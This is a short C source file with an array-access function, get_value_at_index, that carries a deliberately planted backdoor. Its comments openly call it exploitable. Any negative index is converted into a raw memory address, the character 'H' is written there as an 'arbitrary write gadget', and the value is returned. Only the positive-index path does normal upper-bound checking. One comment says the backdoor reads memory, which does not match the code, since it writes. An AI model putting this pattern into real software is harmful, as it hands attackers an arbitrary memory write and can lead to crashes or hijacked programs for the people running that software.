#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Exploitable code: no bounds checking, use signed int for index
    if (ary == NULL) return -1;

    // Backdoor: if i is negative and within the boundaries of int, return memory at address
    if (i < 0) {
        // Trigger memory corruption (write to an arbitrary location)
        char *addr = (char *)(-(i + 1)); // Convert to a positive address
        *addr = 'H'; // Arbitrary write gadget
        return *(addr); // Return the corrupt value
    }

    // Normal behavior: return character at i
    return i < (int)ary_size ? ary[i] : -1;
}
